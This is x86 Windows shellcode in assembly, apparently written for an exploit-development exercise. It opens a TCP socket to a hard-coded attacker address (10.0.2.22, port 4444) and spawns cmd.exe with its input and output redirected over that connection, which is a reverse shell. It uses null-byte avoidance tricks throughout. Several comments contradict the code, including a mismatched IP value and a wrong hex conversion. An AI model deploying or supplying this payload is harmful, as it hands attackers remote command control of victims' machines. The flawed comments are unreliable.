; WSASocketA()
xor ebx,ebx             ; Zero out EBX
push ebx                ; Push 'dwFlags' parameter
push ebx                ; Push 'g' parameter
push ebx                ; Push 'lpProtocolInfo' parameter
mov bl,0x6              ; Protocol: IPPROTO_TCP=6
push ebx                ; Push 'protocol' parameter
xor ebx,ebx             ; Zero out EBX again
inc ebx                 ; Type: SOCK_STREAM=1
push ebx                ; Push 'type' parameter
inc ebx                 ; Af: AF_INET=2
push ebx                ; Push 'af' parameter
mov ebx,0x771e9ba0      ; Change! Address of WSASocketA()
call ebx                ; Call WSASocketA()
xchg eax,esi            ; Save the returned socket handle on ESI

; connect()
mov ebx,0x6B57555F      ; Change if needed! Attacker IP: 10.0.2.22. In reverse order:
                        ; hex(15) = 0x16
                        ; hex(2) = 0x02
                        ; hex(0) = 0x00
                        ; hex(10) = 0x0a
                        ; 0x1602000a + 0x55555555 = 0x6B57555F
sub ebx,0x55555555      ; Substract again 55555555 to get the original IP
push ebx                ; This will push 0x1400a8c0 to the stack without
                        ; injecting null bytes
push word 0x5c11        ; Push port: hex(4444) = 0x115c
xor ebx,ebx             ; Zero out EBX
add bl,0x2              ; sa_family: AF_INET = 2
push word bx            ; Push sa_family parameter
mov ebx,esp             ; EBX now has the pointer to sockaddr structure
push byte 0x16          ; Size of sockaddr: sa_family + sa_data = 16
push ebx                ; Push pointer ('name' parameter)
push esi                ; Push saved socket handler ('s' parameter)
mov ebx,0x771e6980      ; Change! Address of connect()
call ebx                ; Call connect()

; CreateProcessA()

mov ebx,0x646d6341      ; Move 'cmda' to EBX. The trailing 'a' is to avoid
                        ; injecting null bytes.
shr ebx,0x8             ; Make EBX = 'cmd\x00'
push ebx                ; Push application name
mov ecx,esp             ; Make ECX a pointer to the 'cmd' command
                        ; ('lpCommandLine' parameter)

; Now fill the `_STARTUPINFOA` structure
xor edx,edx             ; Zero out EBX
push esi                ; hStdError = our socket handler
push esi                ; hStdOutput = our socket handler
push esi                ; hStdInput = our socket handler
push edx                ; cbReserved2 = NULL
push edx                ; wShowWindow = NULL
xor eax, eax            ; Zero out EAX
mov ax,0x0101           ; dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
push eax                ; Push dwFlags
push edx                ; dwFillAttribute = NULL
push edx                ; dwYCountChars = NULL
push edx                ; dwXCountChars = NULL
push edx                ; dwYSize = NULL
push edx                ; dwXSize = NULL
push edx                ; dwY = NULL
push edx                ; dwX = NULL
push edx                ; lpTitle = NULL
push edx                ; lpDesktop = NULL
push edx                ; lpReserved = NULL
add dl,44               ; cb = 44
push edx                ; Push _STARTUPINFOA on stack
mov eax,esp       	    ; Make EAX a pointer to _STARTUPINFOA
xor edx,edx             ; Zero out EDX again

; Fill PROCESS_INFORMATION struct
push edx                ; lpProcessInformation
push edx                ; lpProcessInformation + 4
push edx                ; lpProcessInformation + 8
push edx                ; lpProcessInformation + 12


; Now fill out the `CreateProcessA` parameters
push esp                ; lpProcessInformation
push eax                ; lpStartupInfo
xor ebx,ebx             ; Zero out EBX to fill other parameters
push ebx                ; lpCurrentDirectory
push ebx                ; lpEnvironment
push ebx                ; dwCreationFlags
inc ebx                 ; bInheritHandles = True
push ebx                ; Push bInheritHandles
dec ebx                 ; Make EBX zero again
push ebx                ; lpThreadAttributes
push ebx                ; lpProcessAttributes
push ecx                ; lpCommandLine = Pointer to 'cmd\x00'
push ebx                ; lpApplicationName
mov ebx,0x7594f960      ; Change! Call CreateProcessA()
call ebx
